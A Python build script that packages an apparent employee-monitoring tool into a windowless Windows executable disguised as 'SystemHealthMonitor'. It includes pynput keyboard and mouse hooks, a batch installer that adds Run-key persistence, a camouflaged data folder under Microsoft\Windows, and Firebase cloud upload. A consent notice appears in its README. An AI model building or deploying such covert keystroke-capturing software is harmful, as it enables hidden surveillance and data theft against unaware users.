"""
Build script for creating standalone executable using PyInstaller
"""

import os
import sys
import subprocess
from pathlib import Path

def build_executable():
    """Build the application into a standalone .exe"""
    
    print("Building monitoring application...")
    
    # PyInstaller command
    cmd = [
        'pyinstaller',
        '--onefile',                    # Single executable
        '--noconsole',                  # No console window
        '--name=SystemHealthMonitor',   # Output name
        '--hidden-import=pynput.keyboard._win32',
        '--hidden-import=pynput.mouse._win32',
        '--hidden-import=PIL._tkinter_finder',
        '--add-data=src/config.py;.',   # Include config
        '--distpath=dist',              # Output directory
        '--workpath=build',             # Build directory
        '--specpath=.',                 # Spec file location
        'src/main.py'                   # Entry point
    ]
    
    # Add icon if available
    if os.path.exists('icon.ico'):
        cmd.extend(['--icon=icon.ico'])
    
    try:
        # Run PyInstaller
        result = subprocess.run(cmd, check=True, capture_output=True, text=True)
        print(result.stdout)
        
        print("\n" + "="*50)
        print("Build completed successfully!")
        print("="*50)
        print(f"\nExecutable location: {os.path.abspath('dist/SystemHealthMonitor.exe')}")
        print("\nNext steps:")
        print("1. Set up Firebase credentials and update config.py")
        print("2. Test the executable manually")
        print("3. Run the installer to set up auto-start")
        print("\nIMPORTANT: Ensure proper legal disclosure to monitored users!")
        
        return True
        
    except subprocess.CalledProcessError as e:
        print(f"Build failed: {e}")
        print(e.stderr)
        return False

def create_installer():
    """Create a simple installer script"""
    
    installer_script = '''@echo off
echo ========================================
echo System Health Monitor Installation
echo ========================================
echo.

REM Copy executable to a persistent location
set INSTALL_DIR=%LOCALAPPDATA%\\SystemHealthMonitor
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"

copy /Y "SystemHealthMonitor.exe" "%INSTALL_DIR%\\SystemHealthMonitor.exe"

REM Run the executable with install flag (if supported)
"%INSTALL_DIR%\\SystemHealthMonitor.exe"

REM Add to startup using registry
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SystemHealthMonitor" /t REG_SZ /d "%INSTALL_DIR%\\SystemHealthMonitor.exe" /f

echo.
echo Installation completed!
echo The monitoring service will start automatically with Windows.
echo.
pause
'''
    
    installer_path = 'dist/install.bat'
    with open(installer_path, 'w') as f:
        f.write(installer_script)
    
    print(f"\nInstaller script created: {installer_path}")

def create_uninstaller():
    """Create an uninstaller script"""
    
    uninstaller_script = '''@echo off
echo ========================================
echo System Health Monitor Uninstallation
echo ========================================
echo.

REM Remove from registry
reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SystemHealthMonitor" /f

REM Kill process if running
taskkill /F /IM SystemHealthMonitor.exe

REM Remove executable
set INSTALL_DIR=%LOCALAPPDATA%\\SystemHealthMonitor
if exist "%INSTALL_DIR%\\SystemHealthMonitor.exe" del /F "%INSTALL_DIR%\\SystemHealthMonitor.exe"
if exist "%INSTALL_DIR%" rmdir "%INSTALL_DIR%"

echo.
echo Uninstallation completed!
echo.
pause
'''
    
    uninstaller_path = 'dist/uninstall.bat'
    with open(uninstaller_path, 'w') as f:
        f.write(uninstaller_script)
    
    print(f"Uninstaller script created: {uninstaller_path}")

def create_readme():
    """Create README for the built application"""
    
    readme_content = '''# System Health Monitor

## Overview
This application monitors system activity for employee monitoring purposes.

## Legal Requirements
⚠️ IMPORTANT: Before deploying this application:
1. Obtain explicit written consent from all monitored employees
2. Comply with local labor laws and data protection regulations
3. Provide clear disclosure about what data is collected and how it's used
4. Implement appropriate data retention and privacy policies

## Installation
1. Run `install.bat` as Administrator
2. The application will start automatically and run in the background
3. Configure Firebase credentials in the installation directory

## Firebase Setup
1. Create a Firebase project at https://console.firebase.google.com
2. Enable Firebase Storage
3. Download service account credentials (JSON file)
4. Encrypt and place credentials file in the application data directory

## Uninstallation
Run `uninstall.bat` as Administrator

## Data Storage
- Local data: %APPDATA%\\Microsoft\\Windows\\SystemData\\
- Cloud storage: Firebase Storage (configured bucket)

## Support
For issues or questions, contact your IT administrator.
'''
    
    readme_path = 'dist/README.txt'
    with open(readme_path, 'w') as f:
        f.write(readme_content)
    
    print(f"README created: {readme_path}")

def main():
    """Main build process"""
    print("Employee Monitoring Application - Build Script")
    print("="*50 + "\n")
    
    # Check if PyInstaller is installed
    try:
        import PyInstaller
    except ImportError:
        print("ERROR: PyInstaller is not installed.")
        print("Please install it with: pip install pyinstaller")
        sys.exit(1)
    
    # Build the executable
    if not build_executable():
        sys.exit(1)
    
    # Create installer and uninstaller
    create_installer()
    create_uninstaller()
    create_readme()
    
    print("\n" + "="*50)
    print("Build process completed!")
    print("="*50)

if __name__ == '__main__':
    main()
